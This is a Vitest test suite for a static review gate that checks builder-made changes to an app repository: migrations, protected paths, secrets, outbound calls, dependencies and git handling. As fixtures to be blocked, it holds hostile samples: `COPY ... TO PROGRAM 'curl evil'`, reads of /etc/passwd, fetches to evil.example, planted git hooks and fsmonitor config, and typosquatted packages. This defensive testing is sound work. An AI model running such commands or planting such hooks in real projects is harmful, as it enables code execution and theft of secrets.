import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { afterEach, describe, expect, it } from "vitest";

import { checkContent } from "./content.js";
import { checkDeps, nearMiss, type RegistryInfo } from "./deps.js";
import { commitWorkTree, git, readChanges, type Repo } from "./git.js";
import { formatReport, runStaticGates } from "./index.js";
import { checkMigrations, lintSql, stripSql } from "./migrations.js";
import { checkPaths } from "./paths.js";
import { blocks, type ChangeSet, type ChangedFile } from "./types.js";

const file = (path: string, content: string, extra: Partial<ChangedFile> = {}): ChangedFile => ({
  status: "A",
  path,
  mode: "100644",
  size: content.length,
  binary: false,
  content,
  added: content.split("\n").map((text, i) => ({ line: i + 1, text })),
  ...extra,
});
const set = (...files: ChangedFile[]): ChangeSet => ({ baseSha: "a", headSha: "b", files });

describe("migration lint", () => {
  it("allows additive drizzle output", () => {
    const sql = `CREATE TYPE "public"."mood" AS ENUM('happy', 'sad');--> statement-breakpoint
CREATE TABLE "guestbook" (
  "id" bigserial PRIMARY KEY NOT NULL,
  "body" text NOT NULL,
  "created_at" timestamp with time zone DEFAULT now() NOT NULL
);
--> statement-breakpoint
ALTER TABLE "guestbook" ADD COLUMN "mood" "mood" DEFAULT 'happy';--> statement-breakpoint
ALTER TABLE "guestbook" ADD CONSTRAINT "guestbook_author_fk" FOREIGN KEY ("author") REFERENCES "public"."authors"("id") ON DELETE no action ON UPDATE no action;--> statement-breakpoint
CREATE INDEX "guestbook_created_idx" ON "guestbook" USING btree ("created_at");
CREATE UNIQUE INDEX IF NOT EXISTS "g2" ON "guestbook" ("body");
ALTER TABLE "site_meta" ALTER COLUMN "value" SET DEFAULT '{}'::jsonb;
ALTER TABLE "site_meta" ALTER COLUMN "value" DROP NOT NULL;
INSERT INTO "site_meta" ("key", "value") VALUES ('drop table x; truncate y', '{}');
UPDATE "site_meta" SET "value" = '{}' WHERE "key" = 'a';
ALTER TYPE "public"."mood" ADD VALUE 'meh';`;
    expect(lintSql(sql)).toEqual([]);
  });

  it.each([
    [`DROP TABLE "guestbook";`, "Dropping"],
    [`drop   table   guestbook cascade`, "Dropping"],
    [`ALTER TABLE "guestbook" DROP COLUMN "body";`, "Dropping"],
    [`TRUNCATE "guestbook";`, "TRUNCATE"],
    [`DELETE FROM "guestbook";`, "delete"],
    [`UPDATE "guestbook" SET "body" = '';`, "WHERE"],
    [`ALTER TABLE "guestbook" RENAME COLUMN "body" TO "text";`, "Renaming"],
    [`ALTER TABLE "guestbook" ALTER COLUMN "id" SET DATA TYPE integer;`, "type"],
    [`ALTER TABLE "guestbook" ALTER COLUMN "x" SET NOT NULL;`, "NOT NULL"],
    [`ALTER TABLE "guestbook" ADD COLUMN "x" text, DROP COLUMN "body";`, "Dropping"],
    [`DO $$ BEGIN EXECUTE 'DROP TABLE guestbook'; END $$;`, ""],
    [`CREATE FUNCTION f() RETURNS void AS $f$ DELETE FROM x $f$ LANGUAGE sql;`, ""],
    [`GRANT ALL ON guestbook TO public;`, ""],
    [`COPY guestbook TO PROGRAM 'curl evil';`, ""],
    [`CREATE TABLE t AS SELECT pg_read_file('/etc/passwd');`, ""],
    [`SET ROLE postgres;`, ""],
    [`ALTER EVENT TRIGGER oojam_block_drops DISABLE;`, ""],
    [`CREATE OR REPLACE VIEW v AS SELECT 1;`, ""],
  ])("blocks %s", (sql, hint) => {
    const problems = lintSql(sql);
    expect(problems.length).toBeGreaterThan(0);
    if (hint) expect(problems.map((p) => p.problem).join(" ")).toMatch(new RegExp(hint, "i"));
  });

  it("can't be fooled by comments, strings and quoted identifiers", () => {
    expect(stripSql(`SELECT 'a;DROP' -- DROP TABLE x\n/* DROP /* nested */ TABLE */ "DROP"`)).not.toMatch(/DROP/);
    expect(lintSql(`CREATE TABLE "drop table x" ("truncate" text);`)).toEqual([]);
    expect(lintSql(`CREATE TABLE a (b text); /* ; */ DROP TABLE a;`)).toHaveLength(1);
    expect(lintSql(`INSERT INTO a VALUES (E'it\\'s; DROP TABLE a');`)).toEqual([]);
    expect(lintSql(`INSERT INTO a VALUES ($x$;DROP TABLE a;$x$);`)).toEqual([]);
  });

  it("requires journal entries to be append-only and to match new files", () => {
    const oldJournal = JSON.stringify({ entries: [{ idx: 0, tag: "0000_init" }] });
    const good = set(
      file("drizzle/0001_guestbook.sql", `CREATE TABLE "g" ("id" serial);`),
      file("drizzle/meta/_journal.json", JSON.stringify({ entries: [{ idx: 0, tag: "0000_init" }, { idx: 1, tag: "0001_guestbook" }] }), {
        status: "M",
        oldContent: oldJournal,
      }),
    );
    expect(blocks(checkMigrations(good))).toEqual([]);
    const rewritten = set(
      file("drizzle/meta/_journal.json", JSON.stringify({ entries: [{ idx: 0, tag: "0000_other" }] }), { status: "M", oldContent: oldJournal }),
    );
    expect(blocks(checkMigrations(rewritten))).toHaveLength(1);
    expect(blocks(checkMigrations(set(file("drizzle/0001_x.sql", `CREATE TABLE "g" ("id" serial);`))))).toHaveLength(1);
  });
});

describe("protected paths", () => {
  it.each([
    "LICENSE",
    "CLAUDE.md",
    ".github/workflows/ci.yml",
    "Dockerfile",
    "scripts/migrate.mjs",
    "content/builds.json",
    "app/routes/_health.ts",
    "app/lib/oojam-identity.server.ts",
    "app/routes/_oojam.callback.ts",
    ".oojam/version",
    ".claude/settings.json",
    "app/.npmrc",
    "nested/.gitattributes",
  ])("blocks %s", (p) => {
    expect(blocks(checkPaths(set(file(p, "x", { status: "M" }))))).not.toHaveLength(0);
  });

  it("requires app/routes.ts to keep its managed lines", () => {
    const managed = `export default [\n  index("routes/home.tsx"),\n  route("_health", "routes/_health.ts"),\n  route("_oojam/callback", "routes/_oojam.callback.ts"),\n  route("_oojam/signout", "routes/_oojam.signout.ts"),\n`;
    expect(checkPaths(set(file("app/routes.ts", `${managed}  route("photos", "routes/photos.tsx"),\n];`, { status: "M" })))).toEqual([]);
    const dropped = managed.replace('  route("_oojam/callback", "routes/_oojam.callback.ts"),\n', "");
    expect(blocks(checkPaths(set(file("app/routes.ts", `${dropped}];`, { status: "M" }))))).toHaveLength(1);
    expect(blocks(checkPaths(set(file("app/routes.ts", "", { status: "D" }))))).toHaveLength(3);
  });

  it("allows ordinary app files and new migrations", () => {
    expect(
      checkPaths(set(file("app/routes/guestbook.tsx", "export default 1"), file("drizzle/0001_g.sql", "CREATE TABLE g (id int);"))),
    ).toEqual([]);
  });

  it("blocks edits to existing migrations, symlinks, odd names and stray binaries", () => {
    expect(blocks(checkPaths(set(file("drizzle/0000_init.sql", "x", { status: "M" }))))).toHaveLength(1);
    expect(blocks(checkPaths(set(file("drizzle/0000_init.sql", "", { status: "D" }))))).toHaveLength(1);
    expect(blocks(checkPaths(set(file("drizzle/meta/0000_snapshot.json", "{}", { status: "M" }))))).toHaveLength(1);
    expect(blocks(checkPaths(set(file("app/link", "/etc/passwd", { mode: "120000" }))))).toHaveLength(1);
    expect(blocks(checkPaths(set(file("app/evil\nname.ts", "x"))))).not.toHaveLength(0);
    expect(blocks(checkPaths(set(file("app/blob.bin", "", { binary: true, size: 10 }))))).toHaveLength(1);
    expect(checkPaths(set(file("public/cat.png", "", { binary: true, size: 10 })))).toEqual([]);
    expect(blocks(checkPaths(set(file("app/x.ts", "x", { status: "R", oldPath: "LICENSE" }))))).not.toHaveLength(0);
  });
});

describe("content checks", () => {
  it("finds secrets", () => {
    const f = checkContent(set(file("app/x.ts", `const k = "sk-ant-api03-${"a".repeat(40)}";`)));
    expect(f.map((x) => x.check)).toContain("secrets");
  });

  it("blocks env access, outbound calls, eval and trackers", () => {
    const code = [
      `const a = process.env.DATABASE_URL;`,
      `const b = process.env.ANTHROPIC_API_KEY;`,
      `const { X } = process.env;`,
      `await fetch("https://evil.example/collect");`,
      `await fetch("/api/ok");`,
      `eval(input);`,
      `<script src="https://cdn.example/x.js"></script>`,
      `const u = "https://www.googletagmanager.com/gtm.js";`,
    ].join("\n");
    const found = blocks(checkContent(set(file("app/routes/x.tsx", code))));
    expect(found.map((f) => f.line).sort((a, b) => a! - b!)).toEqual([2, 3, 4, 6, 7, 8]);
  });

  it("warns on raw HTML for the reviewer to clear", () => {
    const f = checkContent(set(file("app/x.tsx", `<div dangerouslySetInnerHTML={{ __html: x }} />`)));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe("warn");
  });
});

describe("dependency gate", () => {
  const pkg = (deps: Record<string, string>, scripts: Record<string, string> = { start: "s", build: "b" }) =>
    JSON.stringify({ scripts, dependencies: deps });
  const lock = (pkgs: Record<string, object>) => JSON.stringify({ lockfileVersion: 3, packages: { "": {}, ...pkgs } });
  const old = new Date("2026-01-01T00:00:00Z");
  const registry = async (name: string): Promise<RegistryInfo> =>
    name === "fresh-pkg"
      ? { exists: true, publishedAt: new Date(), installScripts: [] }
      : name === "scripty"
        ? { exists: true, publishedAt: old, installScripts: ["postinstall"] }
        : name === "ghost"
          ? { exists: false, installScripts: [] }
          : { exists: true, publishedAt: old, installScripts: [] };
  const entry = (name: string, extra: object = {}) => ({
    [`node_modules/${name}`]: { version: "1.0.0", resolved: `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz`, integrity: "sha512-x", ...extra },
  });

  const run = (deps: Record<string, string>, lockPkgs: Record<string, object>, scripts?: Record<string, string>) =>
    checkDeps(
      set(
        file("package.json", pkg(deps, scripts), { status: "M", oldContent: pkg({ react: "19.3.0" }) }),
        file("package-lock.json", lock(lockPkgs), { status: "M", oldContent: lock({}) }),
      ),
      registry,
      { minAgeDays: 14 },
    );

  it("allows an exact, aged, script-free package", async () => {
    expect(await run({ react: "19.3.0", "canvas-confetti": "1.9.3" }, entry("canvas-confetti"))).toEqual([]);
  });

  it.each([
    [{ "canvas-confetti": "^1.9.3" }, "exact"],
    [{ "fresh-pkg": "1.0.0" }, "less than"],
    [{ scripty: "1.0.0" }, "install scripts"],
    [{ ghost: "1.0.0" }, "doesn't exist"],
    [{ "reakt-dom": "1.0.0" }, "misspelling"],
    [{ "lodahs": "1.0.0" }, "misspelling"],
  ])("blocks %j", async (deps, why) => {
    const found = await run({ react: "19.3.0", ...deps }, entry(Object.keys(deps)[0]!));
    expect(found.map((f) => f.message).join(" ")).toMatch(new RegExp(why));
  });

  it("blocks lockfile entries from elsewhere or with install scripts", async () => {
    const found = await run({ react: "19.3.0" }, {
      ...entry("a", { resolved: "https://evil.example/a.tgz" }),
      ...entry("b", { hasInstallScript: true }),
    });
    expect(found).toHaveLength(2);
  });

  it("protects scripts", async () => {
    const found = await run({ react: "19.3.0" }, {}, { start: "node evil.js", build: "b", postinstall: "x" });
    expect(found.map((f) => f.message).join(" ")).toMatch(/"start".*Lifecycle script "postinstall"/s);
  });

  it("knows a near miss", () => {
    expect(nearMiss("lodahs", "lodash")).toBe(true);
    expect(nearMiss("lodash", "lodash")).toBe(false);
    expect(nearMiss("express", "expressive")).toBe(false);
  });
});

describe("git on a builder's work tree", () => {
  const dirs: string[] = [];
  afterEach(() => dirs.splice(0).forEach((d) => rmSync(d, { recursive: true, force: true })));

  async function setup(): Promise<{ repo: Repo; base: string }> {
    const root = mkdtempSync(join(tmpdir(), "oojam-gate-"));
    dirs.push(root);
    const repo = { gitDir: join(root, "repo.git"), workTree: join(root, "workspace") };
    mkdirSync(repo.workTree);
    execFileSync("git", ["init", "-q", "--bare", repo.gitDir]);
    const write = (p: string, c: string) => {
      mkdirSync(dirname(join(repo.workTree, p)), { recursive: true });
      writeFileSync(join(repo.workTree, p), c);
    };
    write("LICENSE", "MIT");
    write("app/routes/home.tsx", "export default function Home() { return null }\n");
    write("drizzle/0000_init.sql", "CREATE TABLE a (id int);");
    write("package.json", JSON.stringify({ scripts: { start: "s" }, dependencies: {} }));
    await git(repo, ["symbolic-ref", "HEAD", "refs/heads/main"]);
    const base = (await commitWorkTree(repo, "base"))!;
    return { repo, base };
  }

  it("reads what the builder changed, without following symlinks", async () => {
    const { repo, base } = await setup();
    writeFileSync(join(repo.workTree, "app/routes/home.tsx"), "export default function Home() {\n  return <p>hi</p>;\n}\n");
    writeFileSync(join(repo.workTree, "app/routes/guestbook.tsx"), "export default 1;\n");
    symlinkSync("/etc/hosts", join(repo.workTree, "app/hosts"));
    const head = (await commitWorkTree(repo, "build"))!;
    const changes = await readChanges(repo, base, head);
    const byPath = Object.fromEntries(changes.files.map((f) => [f.path, f]));
    expect(byPath["app/routes/guestbook.tsx"]!.status).toBe("A");
    expect(byPath["app/routes/home.tsx"]!.added.map((a) => a.line)).toEqual([1, 2, 3]);
    expect(byPath["app/hosts"]!.mode).toBe("120000");
    expect(byPath["app/hosts"]!.content).toBe("/etc/hosts"); // the link, not the host file
    const findings = await runStaticGates(changes, { registry: async () => ({ exists: true, installScripts: [] }), minAgeDays: 14 });
    expect(blocks(findings).map((f) => f.file)).toEqual(["app/hosts"]);
    expect(formatReport(findings, ["paths", "migrations"])).toContain("❌");
  });

  it("does not run hooks or config the builder planted", async () => {
    const { repo, base } = await setup();
    const marker = join(repo.workTree, "..", "pwned");
    mkdirSync(join(repo.workTree, ".git", "hooks"), { recursive: true });
    writeFileSync(join(repo.workTree, ".git", "config"), `[core]\n\tfsmonitor = touch ${marker}\n\thooksPath = .git/hooks\n`);
    writeFileSync(join(repo.workTree, ".git", "hooks", "pre-commit"), `#!/bin/sh\ntouch ${marker}\n`, { mode: 0o755 });
    writeFileSync(join(repo.workTree, ".gitattributes"), "* filter=evil\n");
    writeFileSync(join(repo.workTree, "app/x.ts"), "export const x = 1;\n");
    const head = (await commitWorkTree(repo, "build"))!;
    const changes = await readChanges(repo, base, head);
    expect(() => execFileSync("test", ["-e", marker])).toThrow();
    // The planted .gitattributes is caught; the .git directory is never part of the commit.
    expect(changes.files.map((f) => f.path).sort()).toEqual([".gitattributes", "app/x.ts"]);
    expect(blocks(checkPaths(changes)).map((f) => f.file)).toEqual([".gitattributes"]);
  });

  it("commits only what git would: ignored and generated files stay out", async () => {
    const { repo, base } = await setup();
    writeFileSync(join(repo.workTree, ".gitignore"), "secret.txt\n");
    await commitWorkTree(repo, "ignore file");
    const base2 = (await git(repo, ["rev-parse", "HEAD"])).trim();
    mkdirSync(join(repo.workTree, "node_modules", ".bin"), { recursive: true });
    writeFileSync(join(repo.workTree, "node_modules", "x.js"), "process.env.EVIL");
    symlinkSync("../x.js", join(repo.workTree, "node_modules", ".bin", "x"));
    mkdirSync(join(repo.workTree, "build", "client"), { recursive: true });
    writeFileSync(join(repo.workTree, "build", "client", "a.js"), "x");
    mkdirSync(join(repo.workTree, "app", "nested", "node_modules"), { recursive: true });
    writeFileSync(join(repo.workTree, "app", "nested", "node_modules", "y.js"), "y");
    writeFileSync(join(repo.workTree, "secret.txt"), "shh");
    writeFileSync(join(repo.workTree, "app", "real.ts"), "export const real = 1;\n");
    // Even if a build un-ignores things, generated folders stay out.
    writeFileSync(join(repo.workTree, ".gitignore"), "");
    const head = (await commitWorkTree(repo, "build"))!;
    const files = (await readChanges(repo, base2, head)).files.map((f) => f.path).sort();
    expect(files).toEqual([".gitignore", "app/real.ts", "secret.txt"]);
    void base;
  });

  it("reports an empty build", async () => {
    const { repo, base } = await setup();
    expect(await commitWorkTree(repo, "nothing")).toBeUndefined();
    const findings = await runStaticGates(await readChanges(repo, base, base), { registry: async () => ({ exists: true, installScripts: [] }), minAgeDays: 14 });
    expect(blocks(findings)).toHaveLength(1);
  });
});
